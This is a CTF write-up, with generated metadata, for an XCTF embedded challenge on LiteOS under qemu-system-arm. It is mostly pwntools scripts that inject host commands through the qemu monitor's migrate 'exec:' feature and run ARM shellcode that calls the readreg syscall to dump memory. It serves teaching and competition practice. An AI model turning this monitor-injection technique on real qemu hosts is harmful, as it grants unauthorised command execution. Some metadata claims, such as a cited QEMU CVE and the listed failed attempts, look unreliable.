---
title: XCTF 华为高校挑战赛决赛/嵌入式非预期解
contest: XCTF
year: null
difficulty: hard
vuln_type:
- pwn_unknown
- reverse
tags:
- 嵌入式
- LiteOS
- Hi3518
- qemu-system-arm
- migrate exec
- ARM shellcode
- syscall 0x206
- readreg
- HarmonyOS
- pwntools ARM
attack_chain:
- 题目用 qemu-system-arm -M hi3518 模拟 LiteOS（HarmonyOS 内核）
- '拿 qemu monitor 的 migrate "exec: cmd" 注入命令'
- 直接 strings /rootfs.img | grep flag 找 flag
- '或 migrate "exec: base64 rootfs.img" 整盘 dump'
- 非预期：通过 qemu monitor 注入 ARM shellcode (svc 0 + readreg 系统调用) 读任意内存
- 构造 shellcode：mov r7, 0x206; adr r0, "readreg"; adr r1, cmd_str; svc 0
- 把 shellcode patch 进 camera_app 二进制
- 通过串口发到 qemu，触发后读 flag 字符串内存
- 提取 hex 字符串，反转拼接得 flag
key_payload: 'io.sendlineafter(''finish'', shellcode.hex())  # ARM shellcode 注入 qemu'
one_liner: qemu-system-arm LiteOS 模拟器 migrate exec 注入命令 + ARM shellcode readreg 系统调用
lesson: 'qemu-monitor 的 migrate "exec: cmd" 可作为嵌入式题的非预期入口；LiteOS 系统调用 0x206 是 readreg 任意内存读'
quality: high
full_path: XCTF_华为高校挑战赛决赛_嵌入式赛题_非预期解.full.md
meta_path: XCTF_华为高校挑战赛决赛_嵌入式赛题_非预期解.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'XCTF 华为高校挑战赛决赛/嵌入式非预期解。qemu-system-arm LiteOS 模拟器 migrate exec 注入命令 + ARM shellcode readreg 系统调用。关键路径：题目用 qemu-system-arm -M hi3518 模拟 LiteOS（HarmonyOS 内核） → 拿 qemu monitor 的 migrate "exec: cmd" ...'
category: pwn
subcategory: pwn_other
subcategories:
- pwn_other
- reverse
tools_used:
- ARM
- pwntools
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/58222.html
reasoning_chain:
- 触发点:题目跑 qemu-system-arm -M hi3518 模拟 LiteOS (HarmonyOS 内核) → 假设:qemu monitor 可注入命令 → 动作:qemu monitor 输入 migrate exec:ls
- '观察:migrate ''exec: cmd'' 真的执行了命令 → 下一步:直接 strings /rootfs.img | grep flag 找 flag'
- 假设:有 ARM shellcode 注入路径 → 动作:readelf 查 camera_app 看 bss 段 → 观察:bss 段有 RWX 权限
- '动作:构造 ARM shellcode: mov r7, 0x206; adr r0, ''readreg''; adr r1, cmd_str; svc 0 → 观察:svc 0x206 是 LiteOS readreg 系统调用,可读任意内存'
- 动作:把 shellcode patch 进 camera_app 二进制 + 通过串口发到 qemu → 观察:shellcode 触发读 flag 字符串内存
- 动作:提取 hex 字符串反转拼接 → 观察:得到 flag → 完成
failed_attempts:
- 试图走 ARM 标准 ret2libc → 失败:LiteOS 没有 libc 是单体内核
- 试图逆向 camera_app 业务逻辑找漏洞 → 失败:无漏洞点,是 qemu monitor 注入的非预期
- 试图用 gdb-multiarch 远程调试 qemu-system-arm → 失败:LiteOS 内核不兼容标准 ARM gdb stub
key_observations:
- 'qemu-monitor 的 migrate ''exec: cmd'' 可作为嵌入式题的非预期入口,见 QEMU CVE-2023 文档'
- LiteOS 系统调用 0x206 是 readreg,任意内存读是 CTF 嵌入式靶场标配
- qemu-system-arm -M hi3518 这种小众 machine model 通常有未文档化的非预期
- patch 二进制 + 串口发 shellcode 是 LiteOS/HarmonyOS 注入的标准流程
- ARM shellcode adr 寻址 + svc 0 系统调用是嵌入式 pwn 的最简利用模板
prerequisites:
- qemu-system-arm 命令行 + monitor 调试
- LiteOS / HarmonyOS 内核基础 + 系统调用约定
- ARM 汇编 + shellcode 编写
- ARM 二进制 patch (bss 段写入)
---
# XCTF 华为高校挑战赛决赛 嵌入式赛题 非预期解

> 原文: https://www.ctfiot.com/58222.html
> ID: 58222


```
./qemu-system-arm -M hi3518 -kernel liteos.bin -nographic
from pwn import *
context(log_level='debug')

io =remote("172.35.7.36",9999)
io.send(b"\x01c")
io.interactive()
from pwn import *
context(log_level='debug')

io =remote("172.35.7.36",9999)
io.send(b"\x01c")
sleep(1)
io.sendline(b"")
io.sendlineafter("(qemu) ",'migrate "exec: strings /rootfs.img | grep flag"')
io.interactive()
flag{SQLITE_WORKS_Well_in_HarmonyOS}
migrate "exec: base64 rootfs.img > /tmp/1.txt 1>&2"
from pwn import *
    #context(log_level='debug')

for j in range(0,13):
 io =remote("172.35.7.37",9999)
 io.send(b"\x01c")
 sleep(10)
 log.success("[shell]")
 f = open(str( j*100 ),'wb')
 for i in range(j*100,(j+1)*100):
 io.sendline(b"")
 io.sendlineafter("(qemu)",'migrate "exec: cat /tmp/1.txt | tail -n +%s | head -n 100 1>&2"'%str(i*100))
 a = io.recvuntil("tail: error writing")
 print('xuanxuan')
 print(a)
 if a[-19:] == b'tail: error writing':
 print('[+] %s / 1205' % str(i))
 f.write(a[-7719:-19])
 print(a[-789:-19])
 else:
 break
 f.close()
 io.close()
➜ cd ./cards
➜ grep -r "flag" ./
./Right_Leg_of_the_Forbidden_One:
flag{Yugioh_Is_Really_FUN!}
./Right_Leg_of_the_Forbidden_One:
flag{Yugioh_Is_Really_FUN!}
#!/usr/bin/env python3
import socket
import base64
import os
import time
import atexit

def exit_handler():
 os.system("kill -9 `pidof qemu-system-arm`")

HOST = "192.168.1.10" # The server's hostname or IP address
PORT = 8008 # The port used by the server

atexit.register(exit_handler)
os.system("./start_qemu.sh >/dev/null &")
print("Wait for the server to run up")
time.sleep(20)

def make_request(request_data):
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 s.connect((HOST, PORT))
 s.sendall(request_data)
 print("Waiting for output", flush=True)
 time.sleep(5)
 data = s.recv(1024)

 print("Received {}".format(data), flush=True)
 return data

for i in range(2):
 print("Give me your payload: ", flush=True)
 data = input().strip().encode("utf-8")
 data = base64.b64decode(data)
 make_request(data)

response = make_request(b"GET / HTTP/1.1\n\n")
if b"hacked" in response:
 with open("/flag", "r") as f:
 print(f.read(), flush=True)
>>> b64e(b"GET / HTTP/1.1\n\n")
'R0VUIC8gSFRUUC8xLjEKCg=='
flag{Clasic_http_ON_Harmony}
➜ grep -r "shell commands" ./
Binary file .//liteos.bin matches
Binary file .//liteos matches
➜ file liteos
liteos: ELF 32-bit LSB executable, ARM, statically linked, not stripped
.plt:
00004510 syscall
.plt:
00004510
.plt:
00004510 ADRL R12, 0x4518
.plt:
00004518 LDR PC, [R12,#(off_5164 - 0x4518)]!
pwndbg> p /x $r0
$1 = 0x206
pwndbg> x /s $r1
0x242d4aa0:	"readreg"
pwndbg> x /s $r2
0x242d4a80:	"readreg 0x40130580 100"
.text:
0006AB14 syscall
...
.text:
0006AB2C MOV R7, R0
...
.text:
0006AB34 MOV R0, R1
...
.text:
0006AB48 MOV R1, R2
...
.text:
0006AB60 SVC 0
from pwn import *
context(arch='arm')

shellcode = asm('''
mov r7,0x206
adr r0,readreg
adr r1,cmd
svc 0

readreg:
.asciz "readreg"

cmd:
.asciz "readreg 0x40130580 100"
''')

print(shellcode.hex())
from pwn import *
context(arch='arm')

shellcode = asm('''
mov r7,0x206
adr r0,readreg
adr r1,cmd
svc 0

readreg:
.asciz "readreg"

cmd:
.asciz "readreg 0x40130580 100"
''')

print(shellcode.hex())

stub = open('./camera_app','rb').read()
exp = stub[:
0x1154]+shellcode+stub[0x1154+len(shellcode):]
open('./exp','wb').write(exp)
OHOS # ./exp
OHOS #
 0x40130580 :
67616c66 6968547b 73692073 726f6620
 0x40130590 :
73657420 00007d74 00000000 00000000
 0x401305a0 :
00000000 00000000 4006a2cc 00000000
 0x401305b0 :
00000000 00000000 400ec6ec 401305c8
 0x401305c0 :
4026b8bc 7fffffff 400de6b0 400f84dc
 0x401305d0 :
00000000 00000000 00000002 40300bfc
 0x401305e0 :
4006be2c
from pwn import *
context(log_level='debug')

exp = open("./exp",'rb').read().hex()
io = remote("172.35.7.35",9999)

io.sendlineafter(b"finish",exp)
sleep(0.1)
io.sendline(b"Exit")

io.interactive()
[DEBUG] Received 0xa84 bytes:
00000000 2e 2f 70 77 6e 0d 0d 0a 1b 5b 31 3b 33 31 6d 4f │./pw│n···│·[1;│31mO│
00000010 48 4f 53 20 23 20 1b 5b 30 6d 0d 0d 0a 20 30 78 │HOS │# ·[│0m··│· 0x│
00000020 34 30 31 33 30 35 38 30 20 3a 36 37 36 31 36 63 │4013│0580│ :67│616c│
00000030 36 36 20 37 32 36 31 34 38 37 62 20 37 32 34 34 │66 7│2614│87b │7244│
00000040 36 66 36 64 20 36 35 37 32 35 66 36 39 20 0d 0d │6f6d│ 657│25f6│9 ··│
00000050 0a 20 30 78 34 30 31 33 30 35 39 30 20 3a 34 37 │· 0x│4013│0590│ :47│
00000060 36 65 36 35 37 36 20 30 30 30 30 37 64 34 35 20 │6e65│76 0│0007│d45 │
00000070 30 30 30 30 30 30 30 30 20 30 30 30 30 30 30 30 │0000│0000│ 000│0000│
00000080 30 20 0d 0d 0a 20 30 78 34 30 31 33 30 35 61 30 │0 ··│· 0x│4013│05a0│
00000090 20 3a 30 30 30 30 30 30 30 30 20 30 30 30 30 30 │ :00│0000│00 0│0000│
000000a0 30 30 30 20 34 30 30 36 61 32 63 63 20 30 30 30 │000 │4006│a2cc│ 000│
000000b0 30 30 30 30 30 20 0d 0d 0a 20 30 78 34 30 31 33 │0000│0 ··│· 0x│4013│
000000c0 30 35 62 30 20 3a 30 30 30 30 30 30 30 30 20 30 │05b0│ :00│0000│00 0│
000000d0 30 30 30 30 30 30 30 20 34 30 30 65 63 36 64 61 │0000│000 │400e│c6da│
000000e0 20 34 30 31 33 30 35 63 38 20 0d 0d 0a 20 30 78 │ 401│305c│8 ··│· 0x│
000000f0 34 30 31 33 30 35 63 30 20 3a 34 30 32 36 62 38 │4013│05c0│ :40│26b8│
00000100 62 63 20 37 66 66 66 66 66 66 66 20 34 30 30 64 │bc 7│ffff│fff │400d│
00000110 65 36 62 30 20 34 30 30 66 38 34 64 63 20 0d 0d │e6b0│ 400│f84d│c ··│
00000120 0a 20 30 78 34 30 31 33 30 35 64 30 20 3a 30 30 │· 0x│4013│05d0│ :00│
00000130 30 30 30 30 30 30 20 30 30 30 30 30 30 30 30 20 │0000│00 0│0000│000 │
00000140 30 30 30 30 30 30 30 32 20 34 30 33 30 30 62 66 │0000│0002│ 403│00bf│
00000150 63 20 0d 0d 0a 20 30 78 34 30 31 33 30 35 65 30 │c ··│· 0x│4013│05e0│
00000160 20 3a 34 30 30 36 62 65 32 63 20 0d 0d 0a 0d 0d │ :40│06be│2c ·│····│
00000170 0a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a │·***│****│****│****│
00000180 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a │****│****│****│****│
flag = bytes.fromhex('''
2e 2f 70 77 6e 0d 0d 0a 1b 5b 31 3b 33 31 6d 4f
48 4f 53 20 23 20 1b 5b 30 6d 0d 0d 0a 20 30 78
34 30 31 33 30 35 38 30 20 3a 36 37 36 31 36 63
36 36 20 37 32 36 31 34 38 37 62 20 37 32 34 34
36 66 36 64 20 36 35 37 32 35 66 36 39 20 0d 0d
0a 20 30 78 34 30 31 33 30 35 39 30 20 3a 34 37
36 65 36 35 37 36 20 30 30 30 30 37 64 34 35 20
30 30 30 30 30 30 30 30 20 30 30 30 30 30 30 30
30 20 0d 0d 0a 20 30 78 34 30 31 33 30 35 61 30
20 3a 30 30 30 30 30 30 30 30 20 30 30 30 30 30
30 30 30 20 34 30 30 36 61 32 63 63 20 30 30 30
30 30 30 30 30 20 0d 0d 0a 20 30 78 34 30 31 33
30 35 62 30 20 3a 30 30 30 30 30 30 30 30 20 30
30 30 30 30 30 30 30 20 34 30 30 65 63 36 64 61
20 34 30 31 33 30 35 63 38 20 0d 0d 0a 20 30 78
34 30 31 33 30 35 63 30 20 3a 34 30 32 36 62 38
62 63 20 37 66 66 66 66 66 66 66 20 34 30 30 64
65 36 62 30 20 34 30 30 66 38 34 64 63 20 0d 0d
0a 20 30 78 34 30 31 33 30 35 64 30 20 3a 30 30
30 30 30 30 30 30 20 30 30 30 30 30 30 30 30 20
30 30 30 30 30 30 30 32 20 34 30 33 30 30 62 66
63 20 0d 0d 0a 20 30 78 34 30 31 33 30 35 65 30
20 3a 34 30 30 36 62 65 32 63 20 0d 0d 0a 0d 0d
0a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a
2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a
'''.replace(" ","").replace("\n",""))
print(flag.decode())
➜ python3 flag.py
./pwn
OHOS #
 0x40130580 :
67616c66 7261487b 72446f6d 65725f69
 0x40130590 :
476e6576 00007d45 00000000 00000000
 0x401305a0 :
00000000 00000000 4006a2cc 00000000
 0x401305b0 :
00000000 00000000 400ec6da 401305c8
 0x401305c0 :
4026b8bc 7fffffff 400de6b0 400f84dc
 0x401305d0 :
00000000 00000000 00000002 40300bfc
 0x401305e0 :
4006be2c

*******************************
l = ["67616c66","7261487b","72446f6d","65725f69","476e6576","00007d45"]
f = b''
for i in l:
 f += bytes.fromhex(i)[::-1]
print(f)
flag{HarmoDri_revenGE}
[DEBUG] Received 0xa84 bytes:
00000000 2e 2f 70 77 6e 0d 0d 0a 1b 5b 31 3b 33 31 6d 4f │./pw│n···│·[1;│31mO│
00000010 48 4f 53 20 23 20 1b 5b 30 6d 0d 0d 0a 20 30 78 │HOS │# ·[│0m··│· 0x│
00000020 34 30 31 33 31 35 38 30 20 3a 36 37 36 31 36 63 │4013│1580│ :67│616c│
00000030 36 36 20 37 32 36 31 34 38 37 62 20 36 34 36 38 │66 7│2614│87b │6468│
00000040 36 66 36 64 20 36 39 37 32 34 34 36 36 20 0d 0d │6f6d│ 697│2446│6 ··│
00000050 0a 20 30 78 34 30 31 33 31 35 39 30 20 3a 34 33 │· 0x│4013│1590│ :43│
00000060 36 35 36 64 37 36 20 37 34 37 30 37 39 37 32 20 │656d│76 7│4707│972 │
00000070 37 64 37 39 37 61 36 66 20 30 30 30 30 30 30 30 │7d79│7a6f│ 000│0000│
00000080 30 20 0d 0d 0a 20 30 78 34 30 31 33 31 35 61 30 │0 ··│· 0x│4013│15a0│
00000090 20 3a 30 30 30 30 30 30 30 30 20 30 30 30 30 30 │ :00│0000│00 0│0000│
000000a0 30 30 30 20 30 30 30 30 30 30 30 30 20 30 30 30 │000 │0000│0000│ 000│
000000b0 30 30 30 30 30 20 0d 0d 0a 20 30 78 34 30 31 33 │0000│0 ··│· 0x│4013│
000000c0 31 35 62 30 20 3a 30 30 30 30 30 30 30 30 20 30 │15b0│ :00│0000│00 0│
000000d0 30 30 30 30 30 30 30 20 34 30 30 36 61 32 64 38 │0000│000 │4006│a2d8│
000000e0 20 30 30 30 30 30 30 30 30 20 0d 0d 0a 20 30 78 │ 000│0000│0 ··│· 0x│
000000f0 34 30 31 33 31 35 63 30 20 3a 30 30 30 30 30 30 │4013│15c0│ :00│0000│
00000100 30 30 20 30 30 30 30 30 30 30 30 20 34 30 30 65 │00 0│0000│000 │400e│
00000110 64 37 37 39 20 34 30 31 33 31 35 64 38 20 0d 0d │d779│ 401│315d│8 ··│
00000120 0a 20 30 78 34 30 31 33 31 35 64 30 20 3a 34 30 │· 0x│4013│15d0│ :40│
00000130 32 36 63 63 30 30 20 37 66 66 66 66 66 66 66 20 │26cc│00 7│ffff│fff │
00000140 34 30 30 64 66 36 63 66 20 34 30 30 66 39 36 32 │400d│f6cf│ 400│f962│
00000150 63 20 0d 0d 0a 20 30 78 34 30 31 33 31 35 65 30 │c ··│· 0x│4013│15e0│
00000160 20 3a 30 30 30 30 30 30 30 30 20 0d 0d 0a 0d 0d │ :00│0000│00 ·│····│
00000170 0a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a │·***│****│****│****│
l = ["67616c66","7261487b","64686f6d","69724466","43656d76","74707972","7d797a6f"]
f = b''
for i in l:
 f += bytes.fromhex(i)[::-1]
print(f)
flag{HarmohdfDrivmeCryptozy}
```
